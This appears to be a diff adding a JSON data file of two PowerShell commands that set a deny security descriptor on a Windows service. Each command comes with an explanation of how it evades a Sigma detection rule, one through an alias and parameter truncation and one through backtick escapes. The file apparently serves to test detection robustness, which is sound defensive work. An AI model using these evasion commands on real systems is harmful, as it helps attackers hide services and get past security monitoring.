@@ -1,0 +1,10 @@
+[
+  {
+    "output": "pwsh.exe -Command \"spsv -Name 'SuspiciousService' -Sec 'D;;DCLC;;;BA'\"",
+    "explanation": "Bypasses the rule by using the PowerShell alias 'spsv' instead of 'Set-Service', and by leveraging PowerShell parameter truncation ('-Sec' instead of '-SecurityDescriptorSddl' or '-sd'). The Sigma rule strictly looks for 'Set-Service ' and the exact parameter strings, causing this functionally equivalent command to evade detection."
+  },
+  {
+    "output": "pwsh.exe -Command \"Set-Service` -Name 'SuspiciousService' -SecurityDescriptorSddl` 'D;;DCLC;;;BA'\"",
+    "explanation": "Bypasses the rule by inserting PowerShell backtick escape characters before the spaces. The Sigma rule expects a space immediately following 'Set-Service' and '-SecurityDescriptorSddl' (e.g., 'Set-Service '). The backticks disrupt the exact string match while remaining valid PowerShell syntax."
+  }
+]
